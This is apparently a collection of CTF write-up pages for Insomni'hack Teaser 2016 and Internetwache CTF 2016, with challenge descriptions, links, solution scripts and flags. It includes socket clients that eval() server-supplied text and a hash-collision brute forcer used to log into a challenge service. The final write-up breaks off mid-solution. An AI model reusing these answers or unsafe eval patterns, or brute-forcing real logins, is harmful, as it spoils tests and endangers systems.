* <https://cryptsec.wordpress.com/2016/01/18/insomnihack-teaser-write-up-bring-the-noise-crypto-200/>
* <https://0x1337seichi.wordpress.com/2016/01/17/insomnihack-2016-ctf-teaser-bring-the-noise-crypto-200/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Insomnihack/crypto/bring-the-noise-200.md#insomnihack-2016--crypto-200>
* <https://gist.github.com/xtrm0/763e9b4ffa6d32dd65dd>
* <https://gist.github.com/anonymous/ee1ab888705c13efb539>
* <https://gist.github.com/elliptic-shiho/935540b52e06a526f396>
* <https://gist.github.com/IgnacioSanmillan/6dc8e82cc90e40bd674f>
* <https://github.com/raccoons-team/ctf/tree/master/2016-01-16-insomnihack-teaser/crypto_200_bring_the_noise>
* <https://gist.github.com/fbonzon/480a1c7877a34d9f3e93>
* <https://adriancohea.ninja/bring-the-noise-insomnihack-teaser-2016/> (SSL Mismatch for Chrome - Try on FireFox or other Browsers :D)
# Insomni'hack Teaser CTF 2016 : Fridginator 10k

**Category:** Crypto / Web
**Points:** 200
**Author:** clZ
**Solves:** 52
**Description:**

> My brother John just bought this high-tech fridge which is all flashy and stuff, but has also added some kind of security mechanism which means I can't steal his food anymore... I'm not sure I can survive much longer without his amazing yoghurts. Can you find a way to steal them for me?
> 
> The fridge is [here](http://fridge.insomnihack.ch/login?next=/)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-01-16-insomnihack/crypto_200_fridginator#eng-version>
* <http://pastebin.com/pHg4erCj>
* <https://pony7.fr/ctf:public:insomnihack:fridginator_10k>
* <https://github.com/raccoons-team/ctf/tree/master/2016-01-16-insomnihack-teaser/%5Bcrypto%2Bweb%5Dfridginator-200>
# Insomni'hack Teaser CTF 2016 : rbaced1

**Category:** Pwning
**Points:** 200
**Author:** awe
**Solves:** 12
**Description:**

> This coffee machine can be controlled from your smartphone.
> 
> We can't provide the app itself, however we found the HTTP server running on the machine... which seems to be *very* crappy and subject to several lame vulnerabilities.
> 
> Since the binaries can't be recompiled, administrators have attempted to harden the system with grsecurity...
> 
> Read /flag_part1 to get the flag for part I. [100pts]
> 
> Run /getflag_part2 to get the flag for part II. [300pts]
> 
> [Challenge files](./rbaced-dac53d8b5c438708dfe754be8fafb4e9.tar.bz2) | [Link](http://rbaced.insomnihack.ch:8080/)
> 
> Your coffee creds: <username> / <password>
> 
> 
> FYI: This is a pwnable, not a web. No kernel exploit involved :)


## Write-up

(TODO)

## Other write-ups and resources

* <https://blog.scrt.ch/2016/01/19/rbaced-a-ctf-introduction-to-grsecurity-rbac/>
* <http://gnoobz.com/insomnihack-teaser-2016-rbaced1.html>
# Insomni'hack Teaser CTF 2016 : rbaced2

**Category:** Pwning
**Points:** 300
**Author:** awe
**Solves:** 2
**Description:**

> This coffee machine can be controlled from your smartphone.
>
> We can't provide the app itself, however we found the HTTP server running on the machine... which seems to be *very* crappy and subject to several lame vulnerabilities.
>
> Since the binaries can't be recompiled, administrators have attempted to harden the system with grsecurity...
>
> Read /flag_part1 to get the flag for part I. [200pts]
>
> Run /getflag_part2 to get the flag for part II. [300pts]
>
> [Challenge files](../rbaced1-200/rbaced-dac53d8b5c438708dfe754be8fafb4e9.tar.bz2) | [Link](http://rbaced.insomnihack.ch:8080/)
> 
> Your coffee creds: <username> / <password>
> 
> 
> FYI: This is a pwnable, not a web. No kernel exploit involved :)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/kitctf/writeups/blob/master/insomnihack-teaser-2016/rbaced2/exploit.py>
* <https://blog.scrt.ch/2016/01/19/rbaced-a-ctf-introduction-to-grsecurity-rbac/>
# Insomni'hack Teaser CTF 2016 : toasted

**Category:** Pwning
**Points:** 200
**Author:** grimmlin
**Solves:** 15
**Description:**

> Welcome to Internet of Toaster! This next-gen piece of art is awaiting you!
> 
> Pwn it on toasted.insomnihack.ch:7200 and read the /flag !
> 
> FYI Runs chrooted so forget about your execve shellcodes.
> 
> files [toaster_files](./toasted_files_8adbbd6d2e2ef0e1781ae302063f018e.tgz)
> 
> Coming soon to a kickstarter near you (patent pending)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/kitctf/writeups/tree/master/insomnihack-teaser-2016/toasted>
* <http://hxp.io/blog/24/Insomni%27hack%20Teaser%202016:%20pwn250%20"toasted"/>
* <https://github.com/raccoons-team/ctf/tree/master/2016-01-16-insomnihack-teaser/pwn_250_toasted>
* <http://gnoobz.com/insomnihack-teaser-2016-toasted.html>
# Insomni'hack Teaser CTF 2016 write-ups

* <https://teaser.insomnihack.ch/>
* [Scoreboard](https://teaser.insomnihack.ch/) or [local alternative](./scoreboard)

## Completed write-ups

* none yet

## External write-ups only

* [crypto/bring-the-noise-200](crypto/bring-the-noise-200)
* [crypto/fridginator-200](crypto/fridginator-200)
* [pwning/rbaced1-200](pwning/rbaced1-200)
* [pwning/rbaced2-300](pwning/rbaced2-300)
* [pwning/toasted-200](pwning/toasted-200)
* [web/greenbox-300](web/greenbox-300)
* [web/smartcat1-50](web/smartcat1-50)
* [web/smartcat2-50](web/smartcat2-50)

## Missing write-ups# Insomni'hack Teaser CTF 2016 : Greenbox

**Category:** (Hipster-)Web
**Points:** 300
**Author:** agix
**Solves:** 33
**Description:**

> [GreenBox](http://greenbox.insomnihack.ch/) is a new generation of remotely controlled and programmed plants !
> 
> Be creative and control behaviour of your plant to get an unique beautiful eccentric plant !
> 
> Your creds to manage your plant: Your team name / <password>
> 
> You need a shell to solve this task


## Write-up

(TODO)

## Other write-ups and resources

* [b01lers](https://b01lers.net/challenges/Insomni%27hack%202016/Greenbox/85/)
* <https://gist.github.com/elliptic-shiho/25b73b40df0125e5b12a>
* <https://gist.github.com/HoLyVieR/f19387f9531c627ec135>
* <http://pastebin.com/ahN71qVK>
* <http://pastebin.com/fMmZ0uFh>
# Insomni'hack Teaser CTF 2016 : smartcat1

**Category:** Web
**Points:** 50
**Author:** grimmlin
**Solves:** 209
**Description:**

> Damn it, that stupid smart cat litter is broken again
> 
> Now only the debug interface is available [here](http://smartcat.insomnihack.ch/cgi-bin/index.cgi) and this stupid thing only permits one ping to be sent!
> 
> I know my contract number is stored somewhere on that interface but I can't find it and this is the only available page! Please have a look and get this info for me !
> 
> FYI No need to bruteforce anything there. If you do you'll be banned permanently


## Write-up

(TODO)

## Other write-ups and resources

* <https://pony7.fr/ctf:public:insomnihack-teaser:smartcat>
* <https://ctf.rip/insomnihack-teaser-2016-smartcat1-50-pt-web-challenge/>
* [b01lers](https://b01lers.net/challenges/Insomni'hack%202016/smartcat1/82/)
* <https://0x1337seichi.wordpress.com/2016/01/17/insomnihack-2016-ctf-teaser-smartcat-1-2-writeup/>
* <http://toh.necst.it/insomnihack/web/smartcat/>
* <http://blog.justinsteven.com/posts/2016/01/18/insomnihack-declawing-smartcat1-and-smartcat2/>
* <https://github.com/raccoons-team/ctf/tree/master/2016-01-16-insomnihack-teaser/web_50-50_smartcat>
* <https://github.com/p4-team/ctf/tree/master/2016-01-16-insomnihack/web_100_smartcat#smartcat1-eng>
* <https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat1-writeup/>
* <http://nusgreyhats.org/write-ups/INSOMNIHACK-CTF-Teaser-2016-Write-Up-Smartcat1/>
* <http://h4ckx0re-ctf-crew.co.nf/2016/01/23/insomnihack-teaser-2016-smartcat1-50-pts/>
* [Spanish](https://blog.ka0labs.net/post/27/)
# Insomni'hack Teaser CTF 2016 : smartcat2

**Category:** Web
**Points:** 50
**Author:** grimmlin
**Solves:** 132
**Description:**

> Almost there, but now you should be able to do better than a cat (sorry about the pun)
>
> I'm sure you can leverage the previous bug to get a shell
>
> Go on [that debug interface](http://smartcat.insomnihack.ch/cgi-bin/index.cgi) again and read the flag in /home/smartcat/


## Write-up

(TODO)

## Other write-ups and resources

* <https://pony7.fr/ctf:public:insomnihack-teaser:smartcat>
* <https://ctf.rip/insomnihack-teaser-2016-smartcat2-50-pt-web-challenge/>
* [b01lers](https://b01lers.net/challenges/Insomni'hack%202016/smartcat2/83/)
* <https://0x1337seichi.wordpress.com/2016/01/17/insomnihack-2016-ctf-teaser-smartcat-1-2-writeup/>
* <https://gist.github.com/xtrm0/3b7d9ed8d425720925f1>
* <http://toh.necst.it/insomnihack/web/smartcat/>
* <http://blog.justinsteven.com/posts/2016/01/18/insomnihack-declawing-smartcat1-and-smartcat2/>
* <https://github.com/raccoons-team/ctf/tree/master/2016-01-16-insomnihack-teaser/web_50-50_smartcat>
* <https://en.internetwache.org/insomnia-teaser-2016-smartcat2-writeup-18-01-2016/>
* <https://github.com/p4-team/ctf/tree/master/2016-01-16-insomnihack/web_100_smartcat#smartcat2-eng>
* <https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat2-writeup/>
* [Spanish](https://blog.ka0labs.net/post/27/)
# Internetwache CTF 2016 : A numbers game II

**Category:** Code
**Points:** 70
**Solves:** 199
**Description:**

> Description: Math is used in cryptography, but someone got this wrong. Can you still solve the equations? Hint: You need to encode your answers.
> 
> 
> Attachment: [code70.zip](./code70.zip)
> 
> 
> Service: 188.166.133.53:11071


## Write-up

This is the same thing as the previous problems, except now they give you an encoding function.

```python
def encode(eq):
	out = []
	for c in eq:
		q = bin(ord(c)^(2<<4)).lstrip("0b")
		q = "0" * ((2<<2)-len(q)) + q
		out.append(q)
	b = ''.join(out)
	pr = []
	for x in range(0,len(b),2):
		c = chr(int(b[x:x+2],2)+51)
		pr.append(c)
	s = '.'.join(pr)
	return s
```

The first part converts it to binary, and pads it to 128 characters. The second part converts it to a number in ASCII apparently and joins the array with a bunch of `.`s. Playing around with it produces the following decoding function:

```python
def decode(s):
	pr = map(lambda i: bin(ord(i) - 51)[2:].zfill(2), s.split("."))
	b = "".join(pr)
	m = ""
	for i in range(0, len(b), 8):
		x = b[i:i+8]
		m += chr(int(x, 2) ^ 32)
	return m
```

Once we have these functions, we just rinse and repeat the last two exercises.

```python
import socket
import sys
from sympy import *

s = socket.socket()
s.connect(("188.166.133.53", 11071))
print s.recv(80)

while True:
	problem = ""
	try:
		problem = s.recv(1024).replace("\n", "")
		q = decode(problem.split(": ")[1].strip("\n"))
		print q
		eq = q.split(" = ")
		sol = str(eval("solve(Eq(%s, %s), x)" % (eq[0], eq[1]))[0])
		print encode(sol)
		s.send("%s\n" % encode(sol))

		print s.recv(19)
	except:
		print problem
		sys.exit(1)
```

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/ppc_70>
* <https://github.com/Kileak/CTF/tree/master/2016/internetwache/code/numbersgame>
* <https://github.com/Execut3/CTF/tree/master/Participated-CTF/2016/InternetWache/coding/code70>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Code/Code70.md>
* <https://www.whitehatters.academy/internetwache-ctf-code50/>
# Internetwache CTF 2016 : A numbers game

**Category:** Code
**Points:** 50
**Solves:** 360
**Description:**

> Description: People either love or hate math. Do you love it? Prove it! You just need to solve a bunch of equations without a mistake.
> 
> 
> Service: 188.166.133.53:11027


## Write-up

This problem is made trivial with `sympy`. Using `socket` to connect to the server, we simply read the equation, stick it into `sympy`, and then reply.

```python
import socket
from sympy import *

x = symbols("x")

s = socket.socket()
s.connect(("188.166.133.53", 11027))
print s.recv(1024)

while True:
	eq = s.recv(40)
	print "eq: %s" % eq
	lvl = eq.split(".: ")[0]
	eq = eq.split(".: ")[1].split(" = ")
	sol = eval("solve(Eq(%s, %s), x)" % (eq[0], eq[1]))[0]
	s.send("%s\n" % sol)

	print s.recv(19)
```

Flag is `IW{M4TH_1S_34SY}` (not that it really matters now)

## Other write-ups and resources

* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-code-50-a-numbers-game-write-up/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/ppc_50>
* <https://github.com/Kileak/CTF/tree/master/2016/internetwache/code/numbersgame>
* <http://cafelinux.info/articles/writeups-internetwache-ctf-2016-a-numbers-game-code50>
* <http://rektsec.github.io/writeups/ctf/internetwatche-2016-ctf-a-numbers-game-code-50/>
* <https://github.com/Execut3/CTF/tree/master/Participated-CTF/2016/InternetWache/coding/code50>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Code/Code50.md>
* <http://err0r-451.ru/internetwache-code-a-numbers-game-50pts/>
* <http://poning.me/2016/03/03/a-numbers-game/>
* <https://www.whitehatters.academy/internetwache-ctf-code50/>
# Internetwache CTF 2016 : Brute with Force

**Category:** Code
**Points:** 80
**Solves:** 66
**Description:**

> Description: People say, you're good at brute forcing... Have fun! Hint: You don't need to crack the 31. character (newline). Try to think of different (common) time representations. Hint2: Time is CET
>
>
> Service: 188.166.133.53:11117


## Write-up

**by [LosFuzzys](https://hack.more.systems)**

After telnet'ing to the given host, we received the following challenge from the server:

```
Trying 188.166.133.53...
Connected to 188.166.133.53.
Escape character is '^]'.
People say, you're good at brute forcing...
Hint: Format is TIME:CHAR
Char 0: Time is 19:53:40, 052th day of 2016 +- 30 seconds and the hash is: f7417f29f9760d97724c6f5c575a26b3dcaf39ef
1264373473:I
Nope, that's not the right solution. Try again later!
Connection closed by foreign host.
```

It was rather obvious that our task was to find a character (CHAR) and the time of hashing (TIME), such that the SHA1 digest of both (TIME:CHAR) was equal to the one given.

The annoying part were the format of the TIME and the timezone (the second hint was only added after we solved the challenge).

Usualy such challenges consist of multiple levels, so we again automated the solving using the beloved [pwntools/binjitsu](https://binjit.su).

Except for the guessing of format (Unix-Timestamp), timezone (CET) and some parsing, the main bruteforcing looked like this:

```python
        for offset in range(0, 62):
            for CHAR in string.printable:
                TIME = str(timestamp + offset)
                text = TIME + ':' + CHAR
                if digest == get_SHA(text):
                    log.info('Solution: ' + text)
                    r.sendline(text)
                    flag += CHAR
```

After 31 rounds, we owned the flag:

```
IW{M4N_Y0U_C4N_B3_BF_M4T3RiAL!}
```

The whole python code used to solve this challenge can be found [on GIST](https://gist.github.com/stefan2904/4c8d2a7652a4e739525d)

## Other write-ups and resources

* <https://forum.xeksec.com/f138/t88656/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/ppc_80>
* <http://losfuzzys.github.io/writeup/2016/02/22/iwctf2016-bruteforce/>
* <https://github.com/Execut3/CTF/tree/master/Participated-CTF/2016/InternetWache/coding/code80>
* <https://github.com/raccoons-team/ctf/tree/master/2016-02-20-internetwache-ctf/code80>
# Internetwache CTF 2016 : Dark Forest

**Category:** Code
**Points:** 90
**Solves:** 69
**Description:**

> Description: Someone pre-ordered a forest and now I'm lost in it. There are a lot of binary trees in front and behind of me. Some are smaller or equal-sized than others. Can you help me to invert the path and find out of the forest? Hint: It's about (inverted) BSTs. Don't forget the spaces.
> 
> 
> Service: 188.166.133.53:11491


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/ppc_90>
* <https://github.com/0xbkth/ctf/blob/master/IW/coding90/writeup.md>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Code/Code90.md>
* <https://github.com/QuokkaLight/write-ups/blob/master/internetwache-ctf-2016/code/code90.md>
# Internetwache CTF 2016 : It's Prime Time!

**Category:** Code
**Points:** 60
**Solves:** 338
**Description:**

> Description: We all know that prime numbers are quite important in cryptography. Can you help me to find some?
> 
> 
> Service: 188.166.133.53:11059


## Write-up

Same thing as the previous problem; if you stick the input into `sympy`, it simplifies the task.

```python
import socket
from sympy import nextprime

s = socket.socket()
s.connect(("188.166.133.53", 11059))
print s.recv(1024)

while True:
	problem = s.recv(1024)
	print problem
	N = int(problem.split("Find the next prime number after ")[1].strip(":\n"))
	sol = nextprime(N)
	s.send("%s\n" % sol)
	print s.recv(19)
```

## Other write-ups and resources

* <https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-code-60-its-prime-time-write-up/>
* <https://forum.xeksec.com/f138/t88655/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/ppc_60>
* <http://cafelinux.info/articles/writeups-internetwache-ctf-2016-its-prime-time-code60>
* <http://rektsec.github.io/writeups/ctf/internetwatche-2016-ctf-its-primer-time-code-60/>
* <https://github.com/Execut3/CTF/tree/master/Participated-CTF/2016/InternetWache/coding/code60>
* <https://deya2diab.wordpress.com/2016/02/20/internetwache-ctf/>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/Internetwache/Code/Code60.md>
* <http://err0r-451.ru/internetwache-code-its-prime-time-60pts/>
* <http://poning.me/2016/03/03/its-prime-time/>
# Internetwache CTF 2016 : Bank

**Category:** Crypto
**Points:** 90
**Solves:** 79
**Description:**

> Description: Everyone knows that banks are insecure. This one super secure and only allows only 20 transactions per session. I always wanted a million on my account.
> 
> 
> Attachment: [crypto90.zip](./crypto90.zip)
> 
> 
> Service: 188.166.133.53:10061


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/internetwache-2016-crypto90-kbeckmann/>
* <https://cryptsec.wordpress.com/2016/02/22/internetwache-ctf-write-up-2016-bank-crypto-90/>
* <https://github.com/raccoons-team/ctf/tree/master/2016-02-20-internetwache-ctf/crypto90>
* <https://github.com/ernacktob/CTF-Writeups/tree/master/Internetwache-CTF-2016/crypto90>
* <https://github.com/m-k-S/ctf-writeups/tree/master/internetwache-2016/bank-90>
* <https://github.com/QuokkaLight/write-ups/blob/master/internetwache-ctf-2016/crypto/crypto90.md>
* <http://poning.me/2016/03/02/bank/>
# Internetwache CTF 2016 : Crypto-Pirat

**Category:** Crypto
**Points:** 50
**Solves:** 35
**Description:**

> Description: Did the East German Secret Police see a Pirat on the sky? Help me find out! Hint: We had 9 planets from 1930–2006... Hint2: Each planet has a number. (There's a table on a well-known website). After that you might be interested in ciphers used by the secret police.
>
>
> Attachment: [crypto50.zip](./crypto50.zip)

## Write-up

**by [LosFuzzys](https://hack.more.systems)**

Given was a text-file with the following content:

```
 ♆♀♇♀♆ ♇♇♀♆⊕ ♇♀♇♀♆ ♇♆♇♆⊕ ♆♇♆♇♇ ♀♆♇♆⊕ ♆♇♆♇♆ ♇♆♇♆⊕ ♆♇♇♀♇ ♀♆⊕♇♀ ♆⊕♇♀♆ ⊕♆♇♆♇
 ♇♀♆♇♆ ⊕♇♀♇♀ ♆⊕♆♇♆ ♇♆♇♇♀ ♆⊕♆♇♆ ♇♆♇♆⊕ ♆♇♆♇♆ ♇♆⊕♇♀ ♆♇♇♀♆ ♇♆⊕♇♀ ♆♇♆♇♇ ♀♆⊕♆♇
 ♆♇♇♀♇ ♀♇♀♆⊕ ♆♇♆♇♇ ♀♆⊕♇♀ ♇♀♆♇♆ ⊕♆♇♇♀ ♆⊕♇♀♆ ♇♇♀♇♀ ♆⊕♆♇♆ ♇♆♇♆♇ ♆⊕♇♀♆ ♇♇♀♆♇
 ♆⊕♇♀♆ ♇♆♇♇♀ ♆⊕♆♇♆ ♇♇♀♇♀ ♇♀♆⊕♇ ♀♆♇♆♇ ♆⊕♇♀♇ ♀♇♀♆⊕ ♇♀♇♀♆ ♇♆♇♆⊕ ♆♇♆♇♆ ♇♆⊕♆♇
 ♇♀♇♀♆ ⊕♆♇♆♇ ♆♇♆♇♇ ♀♆⊕♇♀ ♇♀♆♇♆ ♇♆⊕♆♇ ♆♇♆♇♇ ♀♇♀♆⊕ ♆♇♆♇♆ ♇♆⊕♆♇ ♇♀♆♇♆ ♇♆⊕♆♇
 ♆♇♆♇♆ ♇♆♇♆⊕ ♆♇♇♀♇ ♀♆⊕♇♀ ♇♀♆♇♆ ⊕♆♇♆⊕ ♆♇♆♇♇ ♀♇♀♇♀ ♆⊕♇♀♆ ♇♇♀♆♇ ♆⊕♇♀♇ ♀♆♇♆♇
 ♆♇♆⊕♇ ♀♆♇♆⊕ ♇♀♇♀♆ ♇♆♇♆⊕ ♆♇♆♇♆ ♇♆⊕♇♀ ♆♇♆♇♇ ♀♆⊕♆♇ ♆⊕♇♀♇ ♀♇♀♆⊕ ♆♇♇♀♆ ♇♆⊕♆♇
 ♇♀♇♀♇ ♀♆⊕♆♇ ♇♀♇♀♆ ♇♆⊕♆♇ ♆♇♇♀♆ ⊕♇♀♆♇ ♆♇♆♇♇ ♀♆⊕♇♀ ♆♇♆♇♆ ♇♇♀♆⊕ ♇♀♆♇♆ ♇♆♇♇♀
 ♆⊕♇♀♆ ♇♆♇♆♇ ♇♀♆⊕♇ ♀♆♇♆♇ ♆♇♇♀♆ ⊕♇♀♆♇ ♆♇♆♇♇ ♀
```
Since all this symbols represent symbols of planets, we mapped all of them to their corresponding planet-number (see [Wikipedia](https://en.wikipedia.org/wiki/Planet#/media/File:Mercury_symbol.svg)):

* ♆ - Neptun ... planet 8
* ♇ - Pluto  ... planet 9
* ♀ - Venus   ... planet 2
* ⊕ - Earth ... planet 3

This gave us the following numbers:

```
 82928 99283 92928 98983 89899 28983 89898 98983 89929 28392 83928 38989 92898 39292 83898 98992
 83898 98983 89898 98392 89928 98392 89899 28389 89929 29283 89899 28392 92898 38992 83928 99292
 83898 98989 83928 99289 83928 98992 83898 99292 92839 28989 83929 29283 92928 98983 89898 98389
 92928 38989 89899 28392 92898 98389 89899 29283 89898 98389 92898 98389 89898 98983 89929 28392
 92898 38983 89899 29292 83928 99289 83929 28989 89839 28983 92928 98983 89898 98392 89899 28389
 83929 29283 89928 98389 92929 28389 92928 98389 89928 39289 89899 28392 89898 99283 92898 98992
 83928 98989 92839 28989 89928 39289 89899 2
```
So what's next? After some quick checks, we followed the first hint and searched the Internet for ciphers used by the Stasi. Already the second search-result let us to a cipher called [**TAPIR**](https://rgpsecurity.wordpress.com/2014/10/17/stasi-vernam-cipher-gernator-tapir/).

TAPIR looks like to be an OTP based crypto system, so with only one message this looked like a dead end. But since TAPIR is an anagram of the word PIRAT (from the challenge name) we assumed to be on the right path, and gave it a closer loook.

Before applying OTP (from the agents codebook), TAPIR uses a decoding via the following substituion table:

![TAPIR](/images/posts/2016-02-21-iwctf2016-crypto-pirat-tapir.jpg)

Mind the fact that some characters are mapped to a single digit, while others are mapped to two digits.

Some quick python did the job ...

```python
tapirDecoded = ''
while len(clist) > 0:
    c = clist.pop(0)
    if len(clist) <= 0:
        break
    if int(float(c)) >= 5:
        c2 = clist.pop(0)
        char = tapir[c + c2]
    else:
        char = tapir[c]
    if char not in blacklist:  # Control chars are not relevant
        tapirDecoded += char
    if char == 'ZwR':  # 'Zwr' is 'Zwischenraum'
        tapirDecoded += ' '

print tapirDecoded
```

... and since luckily no OTP was used, revealed the plaintext ... almost:

```
-.- --.. ..-. .... .-- - - ..-. -- ...- ... ... -.-. -..- ..--- ..- --. .- -.-- .... -.-. -..-
..--- -.. --- --.. ... .-- ....- --.. ...-- ... .-.. ..... .-- --. . ..--- -.-. --... -. --.. ...
-..- . --- .-. .--- .--. ..- -...- -...- -...- -...- -...- -...-
```

This is of course morse code. So more python to the rescue:

```python
morseDecoded = morse_talk.decode(tapirDecoded)
print morseDecoded
```

Decoding to the following string:

```
KZFHWTTFMVSSCX2UGAYHCX2DOZSW4Z3SL5WGE2C7NZSXEORJPU
```

The flag? Not yet.

It's also not the obvious Base64, so what else? Of course you cannot decode arbitrary characters in morse, so something with a smaller alphabet has to be used. Base32 to the rescue!

Vuolá! The flag!

```
VJ{Neee!_T00q_Cvengr_lbh_ner:)}
```
Well ... not yet. Of course, the obligatory flag-format *IW{...}* is not present. But this time it's easy. We are still in the crypto category, so ... Caesar cipher, and here we go:

```
IW{Arrr!_GWWd_Pirate_you_are:)}
```

The whole python code used to solve this challenge, plus the TAPIR table in text form, can be found [on GIST](https://gist.github.com/stefan2904/9e92cf559be94ded4f3d).


## Other write-ups and resources

* <https://losfuzzys.github.io/writeup/2016/02/21/iwctf2016-crypto-pirat/>
* <http://cafelinux.info/articles/writeups-internetwache-ctf-2016-crypto-pirat-crypto50>
* <https://ctf.rip/internetwache-2016-crypto-pirat-cryptography-challenge/>
* <http://ctfwriteups.blogspot.de/2016/02/internetwache-ctf-2016-crypto-pirat.html>
* <http://www.melodia.pw/2016/02/22/internetwache-ctf-2016-writeup-crypto-50/>
# Internetwache CTF 2016 : Hashdesigner

**Category:** Crypto
**Points:** 70
**Solves:** 68
**Description:**

> Description: There was this student hash design contest. All submissions were crap, but had promised to use the winning algorithm for our important school safe. We hashed our password and got '00006800007d'. Brute force isn't effective anymore and the hash algorithm had to be collision-resistant, so we're good to go, aren't we?
> 
> 
> Attachment: [crypto70.zip](./crypto70.zip)
> 
> 
> Service: 188.166.133.53:10009


## Write-up

Writeup by [unicornsasfuel](https://github.com/unicornsasfuel)

We are presented with a custom hash algorithm, one which, upon playing with it, results in a lot of collisions through pure brute force attempts. Contrary to the description, which suggests that neither brute force nor collisions will be effective, this is a very viable route to the solution.

Upon connecting to the service, we are asked for a proof-of-work:

~~~
$ ncat 188.166.133.53 10009
You need to provide your proof of work: A sha1 hash with the last two bytes set to 0. It has 40159607 as the prefix. It should match ^[0-9a-z]{15}$
Enter work:
~~~

We can generate the proof-of-work through brute force with the following python script:

~~~python
import sha
import sys
import itertools
import string

prefix = sys.argv[1]

for combo in itertools.combinations_with_replacement(string.lowercase+string.digits,15-len(prefix)):
   if sha.new(prefix + ''.join(combo)).hexdigest()[-4:] == '0000':
      print sha.new(prefix  + ''.join(combo)).hexdigest()
      print prefix + ''.join(combo)
      break
~~~

Upon providing the proof of work, we are presented with a password prompt. We know the correct hash is `00006800007d`, so we use a modified version of the custom hash algorithm script to perform the brute force for us. However, the service does not accept any password shorter than 18 characters. Unfortunately, we are only told this restriction exists once we've done a brute force already. We modify our script to try only 18 character passwords:

~~~
#!/usr/bin/python2
import binascii
import textwrap
import itertools
import string

def tb(s):
	return bin(int(binascii.hexlify(s),32/2)).lstrip("0b")

def te(s):
	p = 2 << 6
	return s + "0" * (p-len(s)%p)

def tk(s):
	return textwrap.wrap(s, 2<<5) #64

def tj(s):
	return textwrap.wrap(s, 2<<3) #16

def ti(l):
	return int(l,2)

def tr(x,y):
	return (x<< y) or (x >> (16-y));

def th(x):
	return "{0:#0{1}x}".format(x,8)

def tp(x,y):
	s = th(x) + th(y)
	s = s.replace("0x","")
	return s

def myhash(text):

	b = tb(text)

	p = te(b)

	bl = tk(p)

	t11 = 3
	q2 = 5

	tu = [ y**2 for y in range(2<<4>>1)]
	to = [2, 7, 8, 2, 5, 3, 7, 8, 9, 4, 11, 13, 5, 8, 14, 15]

	for i in bl:
		t1 = t11
		t2 = q2

		tl = tj(i)
		tq = map(ti, tl)

		for j in range(16):
			if(j >= 12 ):
				tz = (tq[0] & tq[1]) | ~tq[2] 
			elif(j >= 8):
				tz = (tq[3] | tq[2])
			elif(j >= 4):
				tz = (~tq[2] & tq[0]) & (tq[1] | ~tq[0])
			elif(j >= 0):
				tz = (tq[0] | ~tq[2]) | tq[1]
			else:
				pass

			t1 = t1 + tr(tz + tu[j] + tq[j%(16>>2)],to[j])
			t2 = t1 + tr(t2,to[j]) %t1

		t11 += t1
		q2 += t2

	t11 = t11 % 0xFF # Should be 0xFFFFFFFF, right?
	q2 = q2 % 0xFF # Same here... 0xFFFFFFFF

	return tp(t11,q2)
 

print "Starting brute force"

for combo in itertools.combinations_with_replacement(string.lowercase+string.digits,18):
   if myhash(''.join(combo)) == '00006800007d':
      print "Answer found: %s" % (''.join(combo))
~~~

Using our hash collision generator we eventually come up with a suitable password:

~~~
$ pypy myhash.py 
Starting brute force
Answer found: aaaaaaaaaaaaablry6

$ ncat 188.166.133.53 10009
You need to provide your proof of work: A sha1 hash with the last two bytes set to 0. It has 40159607 as the prefix. It should match ^[0-9a-z]{15}$
Enter work:40159607aaainn9
Thank you. Please continue with the login process...
Password: aaaaaaaaaaaaablry6
Logged in!
IW{redacted_flag}
~~~

## Other write-ups and resources

* <https://www.xil.se/post/internetwache-2016-crypto70-kbeckmann/>
* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/crypto_70>
# Internetwache CTF 2016 : Oh Bob!

**Category:** Crypto
**Points:** 60
**Solves:** 142
**Description:**

> Description: Alice wants to send Bob a confidential message. They both remember the crypto lecture about RSA. So Bob uses openssl to create key pairs. Finally, Alice encrypts the message with Bob's public keys and sends it to Bob. Clever Eve was able to intercept it. Can you help Eve to decrypt the message?
> 
> 
> Attachment: [crypto60.zip](./crypto60.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.xil.se/post/internetwache-2016-crypto60-kbeckmann/>
* <https://github.com/ernacktob/CTF-Writeups/tree/master/Internetwache-CTF-2016/crypto60>
* <https://eugenekolo.com/blog/internetwache-2016-ctf-writeups/#ohbob>
* <https://github.com/p4-team/ctf/tree/master/2016-02-20-internetwache/crypto_60>
* <http://err0r-451.ru/internetwache-crypto-oh-bob-60-pts/>
* <https://losfuzzys.github.io/writeup/2016/02/20/iwctf2016-oh-bob/>
* <http://poning.me/2016/03/01/oh-bob/>
# Internetwache CTF 2016 : Procrastination

**Category:** Crypto
**Points:** 80
**Solves:** 47
**Description:**

> Description: Watching videos is fun! Hint: Stegano skills required.
> 
> 
> Attachment: [crypto80.zip](./crypto80.zip)
> 
> 
> Service: <https://procrastination.ctf.internetwache.org>

Sources: <https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/crypto80/code/website>

## Write-up

**by [LosFuzzys](https://hack.more.systems)**

Given was a website including a `song.webm` file. Running `mediainfo` got us the hint,
that there is a second audio trace inside the file.
We used `ffmpeg` to receive the audio file in `wav` format:

```
ffmpeg -i song.webm -map 0:2 out.wav
```

After listening to it, we concluded that it must be some dial-up noise. So we ran some DTMF analysis.

```
multimon-ng -t wav -a DTMF out.wav
```

This gave us some numbers separated by zeros:

```
111 127 173 104 122 60 116 63 123 137 127 61 124 110 137 120 110 60 116 63 123
```

